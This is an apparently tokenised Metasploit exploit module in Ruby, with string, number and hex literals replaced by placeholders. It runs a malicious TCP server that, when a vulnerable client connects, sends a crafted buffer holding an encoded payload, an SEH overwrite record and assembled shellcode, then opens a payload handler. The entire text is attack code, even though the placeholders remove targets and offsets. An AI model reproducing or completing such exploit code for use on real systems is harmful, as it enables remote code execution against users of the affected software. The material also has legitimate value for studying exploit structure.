class Metasploit3 < Msf :: Exploit :: Remote Rank = GreatRanking include Msf :: Exploit :: Remote :: TcpServer include Msf :: Exploit :: Remote :: Seh def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , <str> = > <str> } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > - <int> } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> } ] , ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptPort . new ( <str> , [ true , <str> , <int> ] ) ] , self . class ) end def on_client_connect ( client ) return if ( ( p = regenerate_payload ( client ) ) == nil ) client . get_once sploit = rand_text_alpha_upper ( <int> ) sploit [ <int> , <int> ] = [ <hex> ] . pack ( <str> ) sploit [ <int> , payload . encoded . length ] = payload . encoded sploit [ <int> , <int> ] = generate_seh_record ( target . ret ) sploit [ <int> , <int> ] = Metasm :: Shellcode . assemble ( Metasm :: Ia32 . new , <str> ) . encode_string client . put ( sploit ) handler ( client ) service . close_client ( client ) end end 
